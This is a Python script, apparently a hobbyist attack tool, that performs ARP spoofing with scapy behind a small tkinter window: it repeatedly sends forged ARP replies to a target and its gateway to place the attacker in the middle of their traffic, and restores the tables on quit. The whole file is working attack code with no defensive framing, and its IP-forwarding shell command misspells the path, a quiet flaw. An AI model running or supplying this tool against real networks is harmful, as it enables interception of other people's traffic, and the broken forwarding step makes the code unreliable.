#!/usr/bin/env python

import scapy.all as scapy
import time
import subprocess
import sys
from tkinter import *
import threading


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=2)[0]
    try:
        return answered_list[0][1].hwsrc
    except: return -1


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    while target_mac == -1:
        print("Error in mac")
        target_mac = get_mac(target_ip)

    if target_mac != -1:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    while destination_mac == -1 or source_mac == -1:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
    if destination_mac != -1 and source_mac != -1:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False, count=4)

def send_packets(target_ip, gateway_ip, packets, window):
    packets_sent = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent = packets_sent + 2
       
        packets.delete(1.18, END)
        packets.insert(END, packets_sent)
        window.update()
        

def stop_send(target_ip, gateway_ip, window):
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    window.destroy()

def show_gui(target_ip, gateway_ip):
    window = Tk()
    window.title("ARP Spoof")
    window.geometry('300x100')

    packets = Text(window, bg = "black", font= "white")
    quit_btn = Button(window, text = "Quit",width = 8, command = lambda: stop_send(target_ip, gateway_ip, window))
    quit_btn.pack(side=BOTTOM)
    packets.pack()
    packets.insert(END, "[+] Packets Sent: ")
    send_packets(target_ip, gateway_ip, packets, window)
    window.mainloop()



def arp_run(target_ip,gateway_ip):
    current = "arpspoof"
    subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forword"],shell=True)
    show_gui(target_ip, gateway_ip)
        